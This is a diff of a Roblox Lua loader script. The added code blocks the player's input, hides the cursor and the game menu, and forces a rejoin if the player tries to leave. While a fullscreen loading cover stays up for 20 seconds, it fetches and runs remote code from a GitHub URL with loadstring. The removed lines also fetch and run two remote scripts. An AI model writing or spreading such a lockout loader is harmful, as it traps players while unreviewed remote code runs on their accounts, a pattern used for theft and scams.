@@ -1,33 +1,65 @@
--- Simple Loading Screen
-local player = game.Players.LocalPlayer
-local gui = Instance.new("ScreenGui", player.PlayerGui)
-local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.new(1, 0, 1, 0)
-frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+-- Loader with 20s lock + auto script load
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local UserInputService = game:GetService("UserInputService")
+local TeleportService = game:GetService("TeleportService")
+local CoreGui = game:GetService("CoreGui")
 
-local text = Instance.new("TextLabel", frame)
-text.Size = UDim2.new(1, 0, 1, 0)
-text.BackgroundTransparency = 1
-text.TextColor3 = Color3.fromRGB(255, 255, 255)
-text.TextScaled = true
-text.Text = "Loading... Please wait 20 seconds"
-
-task.wait(20) -- 20-second delay
-
-gui:Destroy()
-
--- Your first script
-local success1, err1 = pcall(function()
-    loadstring(game:HttpGet("https://pastefy.app/TytbwluX/raw", true))()
+-- 1. Disable movement and camera
+UserInputService.InputBegan:Connect(function(input)
+    if true then -- Always block during loading
+        if input.UserInputType == Enum.UserInputType.Keyboard or input.UserInputType == Enum.UserInputType.Gamepad1 then
+            return Enum.ContextActionResult.Sink
+        end
+    end
 end)
-if not success1 then
-    warn("[ERROR] Failed to load your script:", err1)
-end
 
--- Your second script (Limit Hub)
-local success2, err2 = pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Loader.lua", true))()
+-- Disable camera
+workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
+
+-- 2. Hide cursor
+UserInputService.MouseIconEnabled = false
+
+-- 3. Remove menu button temporarily
+pcall(function()
+    CoreGui:FindFirstChild("TopBar"):Destroy()
 end)
-if not success2 then
-    warn("[ERROR] Failed to load Limit Hub:", err2)
-end
+
+-- 4. Auto-rejoin if they try to leave
+LocalPlayer.OnTeleport:Connect(function()
+    TeleportService:Teleport(game.PlaceId, LocalPlayer)
+end)
+
+-- 5. Create loading screen UI (your style)
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.Parent = CoreGui
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(1, 0, 1, 0)
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame.Parent = ScreenGui
+
+local TextLabel = Instance.new("TextLabel")
+TextLabel.Size = UDim2.new(1, 0, 1, 0)
+TextLabel.BackgroundTransparency = 1
+TextLabel.Text = "Loading Script..."
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextSize = 40
+TextLabel.Font = Enum.Font.GothamBold
+TextLabel.Parent = Frame
+
+-- Optional: add spinning loader circle
+local UIStroke = Instance.new("UIStroke")
+UIStroke.Thickness = 2
+UIStroke.Color = Color3.fromRGB(255, 255, 255)
+UIStroke.Parent = Frame
+
+-- 6. Wait 20 seconds, then load your script
+task.wait(20)
+ScreenGui:Destroy()
+UserInputService.MouseIconEnabled = true
+workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
+
+-- Load GaG script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ceanimus1627/GaG-scripts/refs/heads/main/GaG%20updated%20scripts"))()
